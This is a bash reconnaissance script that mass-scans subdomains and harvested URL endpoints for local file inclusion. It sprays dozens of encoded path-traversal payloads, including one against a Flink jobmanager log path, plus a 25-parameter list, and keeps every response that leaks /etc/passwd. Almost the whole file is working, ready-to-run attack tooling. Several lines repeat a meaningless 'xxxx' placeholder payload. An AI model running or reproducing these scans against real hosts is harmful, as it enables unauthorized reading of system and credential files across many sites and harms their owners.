#!/bin/bash

cat << "EOF"
                  I'M WHAT I'M BECAUSE WHAT OF WE ALL ARE.
                    - X0R3R0xF
EOF
sleep 1
### Dirs Preparing..
subdomains=$1
### End Dirs Preparing

 printf "
\e[96m##################################################\e[0m
   \e[96m Check GF-lfi results... ~ \e[0m \e[31mL\e[0m
\e[96m##################################################\e[0m
"

cat $subdomains | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -title -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent | anew lfi-results.txt

cat $subdomains | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -silent -mr "root:x" | anew lfi-results.txt

cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "../../../../../etc/passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "....//....//....//etc/passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "....\/....\/....\/etc/passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"  -silent| httpx -t 250 -mr "root:x" | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "../../../etc/passwd%00" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "..%252f..%252f..%252fetc%252fpasswd" | httpx -t 250 -mr "root:x" -silent| anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "%252e%252e%252fetc%252fpasswd" | httpx -t 250 -mr "root:x" -silent| anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "%252e%252e%252fetc%252fpasswd%00" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "utils/scripts/../../../../../etc/passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "/etc//passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "/etc/./passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "/etc/passwd/" | httpx -t 250 -mr "root:x"  -silent| anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "/etc/passwd/." | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\." | httpx -t 250 -mr "root:x" -silent| anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "a/../../../../../../../../../etc/passwd/././././././././././." | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "....//....//etc/passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "..///////..////..//////etc/passwd" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd" -silent | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "xxxx" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "xxxx" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "xxxx" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "xxxx" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt
cat ../x0rarchiv/results/GFvulns/lfi.txt | qsreplace "xxxx" | httpx -t 250 -mr "root:x" -silent | anew lfi-results.txt




declare -a toplfiparam=(
"cat=../../../../../etc/passwd
" "dir=../../../../../etc/passwd
" "action=../../../../../etc/passwd
" "board=../../../../../etc/passwd
" "date=../../../../../etc/passwd
" "detail=../../../../../etc/passwd
" "file=../../../../../etc/passwd
" "download=../../../../../etc/passwd
" "path=../../../../../etc/passwd
" "folder=../../../../../etc/passwd
" "prefix=../../../../../etc/passwd
" "include=../../../../../etc/passwd
" "page=../../../../../etc/passwd
" "inc=../../../../../etc/passwd
" "locate=../../../../../etc/passwd
" "show=../../../../../etc/passwd
" "doc=../../../../../etc/passwd
" "site=../../../../../etc/passwd
" "type=../../../../../etc/passwd
" "view=../../../../../etc/passwd
" "content=../../../../../etc/passwd
" "document=../../../../../etc/passwd
" "layout=../../../../../etc/passwd
" "mod=../../../../../etc/passwd
" "conf=../../../../../etc/passwd"
)



 printf "
\e[96m##################################################\e[0m
   \e[96m Checking top 25 lfi params ... ~ \e[0m \e[31mSubdomains\e[0m
\e[96m##################################################\e[0m
"

FILE=lfi_SubSpray.txt
if test -f "$FILE"; then
    rm -rf lfi_SubSpray.txt
fi

for domain in $(cat $subdomains); do
  for lfiparam in "${toplfiparam[@]}"; do
    echo $domain"/?"$lfiparam >> lfi_SubSpray.txt
  done;
done;

httpx -t 250 -l lfi_SubSpray.txt -mr "root:x" -silent | tee lfi-results.txt

 printf "
\e[96m##################################################\e[0m
   \e[96m Checking top 25 lfi params ... ~ \e[0m \e[31mEndpoints\e[0m
\e[96m##################################################\e[0m
"

FILE=lfi_endSpray.txt
if test -f "$FILE"; then
    rm -rf lfi_endSpray.txt
fi
for endpoint in $(cat ../x0rarchiv/results/all-InOne.txt | grep "="); do
  for lfiparam in "${toplfiparam[@]}"; do
    echo $endpoint"&"$lfiparam >> lfi_endSpray.txt
  done;
done;

httpx -t 250 -l lfi_endSpray.txt -mr "root:x" -silent | tee lfi-results.txt


cat $subdomains | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent >> lfi-results.txt







